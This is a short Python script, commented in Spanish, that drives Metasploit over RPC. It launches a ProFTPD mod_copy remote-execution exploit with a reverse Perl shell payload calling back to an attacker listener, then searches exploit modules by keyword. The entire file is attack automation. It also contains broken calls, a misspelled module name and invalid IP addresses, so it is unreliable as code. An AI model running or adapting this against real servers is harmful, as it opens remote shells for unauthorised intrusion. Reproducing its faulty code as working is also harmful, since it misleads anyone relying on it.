from metasploit.msfrpc import MsfRpcClient


def connect_metasploit():
    client = MsfRpcClient("password",ssl=True)
    print("Conectando a metasploit")
    return client




def search_exploit(client,keyword):
    exploits = client.modules.exploits
    filter_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lowe()]
    print(f"exploits que contienen : {keyword}")

    for exploit in filter_exploits:
        print(exploit)

def setup_and_run_exploit (client):
    exploit = client.modules.user("exploit","unix/ftp/proftdp_modcopy_exec")

    #configurar las opciones del explot:

    exploit['RHOSTS']='192.12.3.4.5'
    exploit['SITEPATH']='/var/www/html'
    payload = client.modules.use("payload","cmd/unix/reverse_perl")
    payload['LHOST']='192.168.2323'
    payload['LPORT']=4445
    #Ejecutar el excplot

    print("ejecutando el exploit...")

    output = exploit.execute (payload=payload)

    print(output)


def main ():
    client = connect_metasploit()
    setup_and_run_exploit(client)
    keyword = input("Introduce la palabra clave para buscar exploits:")
    search_exploit(client,keyword)

if __name__ == "__main__":
    main()